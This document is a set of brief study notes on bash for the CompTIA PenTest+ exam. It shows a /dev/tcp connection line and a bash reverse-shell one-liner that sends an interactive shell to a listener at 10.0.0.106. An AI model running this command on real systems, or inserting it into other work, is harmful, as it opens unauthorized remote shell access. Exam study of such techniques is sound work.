These are short notes on bash for the Pentest Plus exam from comptia.


Binding with NetCat 'nc'

$ exec 5<>/dev/tcp/hostnameorIP/port


If you want to make a connection with bash you can. find the open port or open a port or your own by setting up a listener with socat netcat etc..


$ bash -i >& /dev/tcp/10.0.0.106/9999
